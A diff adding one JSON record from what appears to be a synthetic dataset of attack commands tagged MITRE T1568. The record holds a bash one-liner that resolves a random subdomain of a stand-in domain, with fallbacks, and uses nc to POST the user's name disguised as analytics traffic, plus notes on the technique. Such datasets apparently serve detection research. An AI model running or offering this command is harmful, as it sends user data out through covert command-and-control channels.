@@ -1,0 +1,23 @@
+{
+  "technique_id": "T1568",
+  "platform": "Linux",
+  "shell": "bash",
+  "command": "bash -c \"base=cdn-example.net; rand=$(head -c16 /dev/urandom | tr -dc a-z0-9 | head -c8); d=\\\"$rand.$base\\\"; host=''; ip=''; for h in \\\"$d\\\" \\\"$base\\\" static.$base; do ip=$(getent hosts \\\"$h\\\" | awk '{print $1}' | shuf -n1); if [ -n \\\"$ip\\\" ]; then host=\\\"$h\\\"; break; fi; done; ua=\\\"Mozilla/5.0 (X11; Linux x86_64)\\\"; body=\\\"evt=pageview&u=$USER\\\"; printf 'POST /collect HTTP/1.1\\r\\nHost: %s\\r\\nUser-Agent: %s\\r\\nContent-Type: application/x-www-form-urlencoded\\r\\nContent-Length: %d\\r\\nConnection: close\\r\\n\\r\\n%s' \\\"$host\\\" \\\"$ua\\\" ${#body} \\\"$body\\\" | nc -w 5 \\\"$ip\\\" 80\"",
+  "explanation": "Uses a random subdomain (runtime DGA-like behavior) with fallback domains and resolves via system NSS (getent); posts telemetry-looking data to a generic collection path.",
+  "rationale_steps": [
+    "Generate random subdomain to force dynamic DNS lookup each run.",
+    "Resolve with getent to use system resolver and caches.",
+    "Fallback to base and static domains for persistence.",
+    "Imitate analytics POST over HTTP via nc."
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-BASH-T1568-213026ff-763c9a16",
+  "source_prompt_hash": "213026ff",
+  "timestamp_utc": "2025-09-30T03:23:47.812011Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judge": null,
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
